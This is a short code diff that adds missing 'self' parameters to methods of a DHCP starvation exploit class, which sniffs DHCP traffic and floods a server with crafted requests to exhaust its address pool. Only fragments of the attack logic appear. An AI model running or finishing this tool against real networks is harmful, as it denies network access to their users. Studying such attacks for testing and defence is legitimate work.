@@ -106,7 +106,7 @@ class DHCPstarve(Exploit):
 
         }
 
-    def callback_dhcp_handle(pkt):
+    def callback_dhcp_handle(self, pkt):
         """
         Function to handle captured DHCP packets
         """
@@ -117,7 +117,7 @@ class DHCPstarve(Exploit):
             elif pkt[DHCP].options[0][1] == 6:
                 print("NAK received")
 
-    def sniff_udp_packets():
+    def sniff_udp_packets(self):
         """
         Function to sniff UDP packets to the port 67 and 68
         """
@@ -125,7 +125,7 @@ class DHCPstarve(Exploit):
               prn=callback_dhcp_handle,
               store=0)
 
-    def occupy_IP():
+    def occupy_IP(self):
         """
         Crafting DHCPRequest packet and send it to the DHCP server/ our target
         """
@@ -154,7 +154,7 @@ class DHCPstarve(Exploit):
             print("Trying to occupy " + requested_addr)
             sleep(0.2)  # interval to avoid congestion and packet loss
 
-    def exploit():
+    def exploit(self):
         try:
             thread = Thread(target=sniff_udp_packets)
             thread.start()
